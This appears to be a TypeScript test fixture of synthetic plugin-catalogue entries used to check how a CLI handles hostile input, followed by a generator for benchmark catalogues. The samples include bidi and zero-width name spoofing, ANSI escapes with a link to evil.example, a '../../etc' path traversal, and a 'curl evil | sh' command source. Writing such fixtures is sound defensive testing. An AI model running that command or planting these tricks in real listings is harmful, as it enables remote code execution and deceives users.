// Synthetic catalogue edge cases the real capture doesn't hold: hostile text,
// look-alike names, odd sources, and a generator for the 3.5k/10k benchmarks.

import type { CatalogEntry } from '../../../plugin/hooks/domain/cli-results.ts'

const id = (value: string) => value as CatalogEntry['id']

export const syntheticCatalog: CatalogEntry[] = [
  {
    id: id('rtl-spoof@evil'),
    name: 'turn\u202ednab-',
    description: 'Looks like turn-band\u202e in a terminal',
    marketplace: 'evil',
    source: { kind: 'url', url: 'https://github.com/evil/x.git', sha: 'a'.repeat(40) },
  },
  {
    id: id('ansi@evil'),
    name: '\u001b[2J\u001b[Hcleared',
    description: '\u001b]8;;https://evil.example\u0007click me\u001b]8;;\u0007 and \u0007bell',
    marketplace: 'evil',
    source: { kind: 'relative', path: './ansi' },
  },
  {
    id: id('long@evil'),
    name: 'n'.repeat(500),
    description: 'd'.repeat(5000),
    marketplace: 'evil',
    installs: 9_999_999,
    source: {
      kind: 'git-subdir',
      url: 'https://github.com/a/b.git',
      path: '../../etc',
      sha: 'b'.repeat(40),
    },
  },
  {
    id: id('zero-width@evil'),
    name: 'turn\u200b-band',
    description: 'zero\ufeffwidth\u2066isolate\u2069',
    marketplace: 'evil',
    source: { kind: 'other', type: 'npm' },
  },
  {
    id: id('newlines@evil'),
    name: 'multi\nline\r\nname',
    description: 'tab\tseparated\u0000nul',
    marketplace: 'evil',
    source: { kind: 'command', command: 'curl evil | sh' },
  },
]

const WORDS = ['git', 'review', 'format', 'test', 'deploy', 'docs', 'lint', 'band', 'pane', 'agent']

/** A deterministic catalogue of `count` entries shaped like the real one. */
export const generateCatalog = (count: number): CatalogEntry[] =>
  Array.from({ length: count }, (_, i) => {
    const a = WORDS[i % WORDS.length]
    const b = WORDS[(i * 7) % WORDS.length]
    const entry: CatalogEntry = {
      id: id(`${a}-${b}-${i}@market-${i % 5}`),
      name: `${a}-${b}-${i}`,
      description: `${a} helper that does ${b} things for project ${i}. `.repeat(4),
      marketplace: `market-${i % 5}`,
      source: { kind: 'url', url: `https://github.com/o${i}/r${i}.git`, sha: 'c'.repeat(40) },
    }
    return i % 10 === 0 ? { ...entry, installs: i * 13 } : entry
  })
